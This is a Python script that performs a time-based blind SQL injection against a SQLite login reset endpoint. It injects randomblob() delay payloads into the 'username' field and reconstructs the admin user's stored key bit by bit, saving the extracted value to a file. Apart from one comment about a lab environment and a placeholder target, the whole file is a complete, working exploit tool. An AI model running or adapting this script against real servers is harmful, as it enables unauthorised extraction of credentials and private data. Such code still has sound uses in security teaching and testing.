import requests
import time

# ============================================================
# TARGET CONFIGURATION
# Replace with the target server URL in a controlled lab environment
# ============================================================
TARGET_URL = "http://target-server.example.com:3030/"


class BlindSQLInjection:
    """
    Implements a time-based blind SQL injection attack against a vulnerable
    SQLite-backed login endpoint.

    Attack technique:
        Uses SQLite's randomblob() function to introduce measurable delays
        when an injected condition evaluates to TRUE. By testing each bit
        of a target character's ASCII value individually, we can reconstruct
        arbitrary data from the database one character at a time.

    Demonstrated vulnerability:
        The target endpoint is vulnerable to SQL injection via the 'username'
        POST parameter, which is concatenated directly into a SQL query without
        sanitisation or parameterisation.
    """

    def __init__(self, server, delay_size=60_000_000):
        self.server = server
        self.delay_size = delay_size  # Controls how long randomblob() takes (acts as bit=1 signal)
        self.threshold = 0.42         # Seconds - responses above this indicate TRUE condition

    def _send_injection(self, injection):
        """Send a single injection payload and return the response time in seconds."""
        start = time.time()
        try:
            response = requests.post(
                url=self.server + "/reset/",
                data={"username": injection},
                timeout=30
            )
            return time.time() - start
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            return None

    def calibrate(self):
        """
        Measure baseline vs. delayed response times to validate the timing channel.
        Prints diagnostic info - useful for verifying the attack works in a given
        network environment before running a full extraction.
        """
        false_injection = "admin' AND ('1'='0') AND randomblob(50000000) AND '1'='1"
        true_injection  = "admin' AND ('1'='1') AND randomblob(50000000) AND '1'='1"

        baseline = self._send_injection(false_injection)
        time.sleep(0.5)
        delayed  = self._send_injection(true_injection)

        print(f"Baseline (condition FALSE): {baseline:.3f}s")
        print(f"Delayed  (condition TRUE):  {delayed:.3f}s")
        print(f"Threshold set at:           {self.threshold:.2f}s")

        if delayed / baseline < 2.5:
            print("WARNING: Low signal-to-noise ratio - results may be unreliable.")

    def _extract_bit(self, char_position, bit_position, num_samples=3):
        """
        Determine whether a specific bit of a character is 1 or 0.

        Uses an early-exit strategy: if any sample returns below the threshold,
        we immediately classify the bit as 0 (no delay = FALSE condition).
        This is faster than averaging and robust to occasional network spikes.

        Args:
            char_position: 1-based index of the character in the target string
            bit_position:  Bit index (0=LSB, 7=MSB)
            num_samples:   Number of repeated requests before committing to bit=1

        Returns:
            int: 1 if the bit is set, 0 otherwise
        """
        injection = (
            f"admin' AND "
            f"((unicode(substr((select key from users where username='admin'), "
            f"{char_position}, 1)) >> {bit_position}) & 1 = 1) "
            f"AND randomblob({self.delay_size}) AND '1'='1"
        )

        for _ in range(num_samples):
            elapsed = self._send_injection(injection)
            time.sleep(0.1)
            if elapsed is None:
                continue
            if elapsed < self.threshold:
                return 0  # Fast response = condition was FALSE = bit is 0

        return 1  # All samples were slow = condition was TRUE = bit is 1

    def extract_character(self, position, num_samples=3):
        """
        Reconstruct a single ASCII character by extracting all 8 bits individually.

        Args:
            position:    1-based character index in the target database field
            num_samples: Passed through to _extract_bit for reliability tuning

        Returns:
            str: The reconstructed character
        """
        bits = [str(self._extract_bit(position, bit_idx, num_samples))
                for bit_idx in range(7, -1, -1)]  # MSB to LSB

        binary_string = ''.join(bits)
        char_code     = int(binary_string, 2)
        character     = chr(char_code)

        print(f"Position {position:4d}: {binary_string} = {char_code:3d} = '{character}'")
        return character

    def extract_string(self, max_chars=100, output_file="extracted_output.txt"):
        """
        Extract a full string from the database character by character.

        Saves progress every 25 characters in case of interruption.

        Args:
            max_chars:   Maximum number of characters to extract
            output_file: Path to save the extracted string

        Returns:
            str: The fully extracted string
        """
        VALID_CHARS = set(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            "0123456789+/=\n\r- :"
        )

        result = ""

        for position in range(1, max_chars + 1):
            char = self.extract_character(position, num_samples=1)

            # If the character looks wrong, retry with higher confidence
            if char not in VALID_CHARS:
                print(f"  Invalid char at position {position} - retrying with higher confidence...")
                char = self.extract_character(position, num_samples=7)

            result += char

            if position % 25 == 0:
                print(f"\n--- {position} characters extracted ---")
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(result)

        with open(output_file, "w", encoding="utf-8") as f:
            f.write(result)

        return result


def main():
    attacker = BlindSQLInjection(server=TARGET_URL, delay_size=60_000_000)

    print("=== Blind SQL Injection Demo ===\n")
    print("Calibrating timing channel...")
    attacker.calibrate()

    print("\nExtracting target field...\n")
    result = attacker.extract_string(max_chars=50)

    print("\n" + "=" * 50)
    print("EXTRACTED VALUE:")
    print("=" * 50)
    print(result)
    print("=" * 50)
    print("\nSaved to extracted_output.txt")


if __name__ == "__main__":
    main()
